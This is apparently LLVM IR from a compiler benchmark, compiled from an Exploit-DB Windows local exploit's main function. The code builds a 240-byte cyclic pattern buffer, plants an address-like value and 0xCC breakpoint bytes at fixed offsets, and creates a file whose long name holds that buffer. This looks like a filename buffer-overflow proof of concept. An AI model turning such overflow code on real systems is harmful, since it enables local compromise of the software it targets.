; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_19968.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_19968.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [11 x i8] c"%s\\AAAA.%s\00", align 1
@PATH = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.2 = private unnamed_addr constant [30 x i8] c"Error creating file, sorry !\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1024 x i8], align 16
  %7 = alloca [256 x i8], align 16
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8 97, i8* %10, align 1
  store i8 65, i8* %11, align 1
  store i32 0, i32* %9, align 4
  br label %12

12:                                               ; preds = %49, %2
  %13 = load i32, i32* %9, align 4
  %14 = icmp slt i32 %13, 240
  br i1 %14, label %15, label %52

15:                                               ; preds = %12
  %16 = load i8, i8* %10, align 1
  %17 = load i32, i32* %9, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 %18
  store i8 %16, i8* %19, align 1
  %20 = load i8, i8* %11, align 1
  %21 = load i32, i32* %9, align 4
  %22 = add nsw i32 %21, 1
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 %23
  store i8 %20, i8* %24, align 1
  %25 = load i8, i8* %11, align 1
  %26 = sext i8 %25 to i32
  %27 = add nsw i32 %26, 1
  %28 = trunc i32 %27 to i8
  %29 = load i32, i32* %9, align 4
  %30 = add nsw i32 %29, 2
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 %31
  store i8 %28, i8* %32, align 1
  %33 = load i8, i8* %11, align 1
  %34 = sext i8 %33 to i32
  %35 = add nsw i32 %34, 2
  %36 = trunc i32 %35 to i8
  %37 = load i32, i32* %9, align 4
  %38 = add nsw i32 %37, 3
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 %39
  store i8 %36, i8* %40, align 1
  %41 = load i8, i8* %10, align 1
  %42 = add i8 %41, 1
  store i8 %42, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 122
  br i1 %44, label %45, label %48

45:                                               ; preds = %15
  store i8 97, i8* %10, align 1
  %46 = load i8, i8* %11, align 1
  %47 = add i8 %46, 1
  store i8 %47, i8* %11, align 1
  br label %48

48:                                               ; preds = %45, %15
  br label %49

49:                                               ; preds = %48
  %50 = load i32, i32* %9, align 4
  %51 = add nsw i32 %50, 4
  store i32 %51, i32* %9, align 4
  br label %12

52:                                               ; preds = %12
  %53 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 240
  store i8 0, i8* %53, align 16
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 127
  store i8 80, i8* %54, align 1
  %55 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 128
  store i8 80, i8* %55, align 16
  %56 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 129
  store i8 80, i8* %56, align 1
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 130
  store i8 80, i8* %57, align 2
  %58 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 135
  store i8 96, i8* %58, align 1
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 136
  store i8 96, i8* %59, align 8
  %60 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 137
  store i8 96, i8* %60, align 1
  %61 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 138
  store i8 96, i8* %61, align 2
  %62 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 139
  store i8 119, i8* %62, align 1
  %63 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 140
  store i8 -83, i8* %63, align 4
  %64 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 141
  store i8 -71, i8* %64, align 1
  %65 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 142
  store i8 -65, i8* %65, align 2
  %66 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 163
  store i8 -52, i8* %66, align 1
  %67 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 164
  store i8 -52, i8* %67, align 4
  %68 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 165
  store i8 -52, i8* %68, align 1
  %69 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %70 = load i8*, i8** @PATH, align 8
  %71 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %72 = call i32 @sprintf(i8* %69, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i8* %70, i8* %71)
  %73 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %74 = call i32* @fopen(i8* %73, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32* %74, i32** %8, align 8
  %75 = load i32*, i32** %8, align 8
  %76 = icmp eq i32* %75, null
  br i1 %76, label %77, label %79

77:                                               ; preds = %52
  %78 = call i32 @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.2, i64 0, i64 0))
  br label %82

79:                                               ; preds = %52
  %80 = load i32*, i32** %8, align 8
  %81 = call i32 @fclose(i32* %80)
  br label %82

82:                                               ; preds = %79, %77
  %83 = load i32, i32* %3, align 4
  ret i32 %83
}

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
